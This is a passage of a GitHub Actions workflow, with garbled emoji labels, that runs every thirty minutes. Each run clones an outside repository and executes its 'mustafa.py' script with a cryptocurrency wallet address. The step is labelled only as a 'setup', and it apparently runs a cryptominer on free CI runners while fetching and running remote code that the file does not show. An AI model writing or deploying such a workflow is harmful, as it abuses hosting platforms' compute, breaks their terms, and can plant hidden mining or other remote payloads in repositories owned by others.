  schedule:
    - cron: '*/30 * * * *'
  workflow_dispatch:

jobs:
  auto-run:
    runs-on: ubuntu-latest
    
    steps:
    - name: ðŸ“¥ Checkout
      uses: actions/checkout@v4
    
    - name: ðŸ Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'
    
    - name: ðŸš€ Run Mustu Setup
      run: |
        echo "ðŸš€ Starting mustu setup..."
        
        # Clone repository
        git clone https://github.com/thumpingpp/mustu-setup.git
        
        # Go to directory and set permissions
        cd mustu-setup
        chmod +x mustafa
        
        # Run with wallet
        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" 2>&1 | grep -v "apt"
        
        echo "âœ… Done!"
    
    - name: ðŸ’¾ Save Log
      run: |
        echo "Last run: $(date)" > last_run.txt
        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" >> last_run.txt
    
    - name: ðŸ“¤ Upload Log
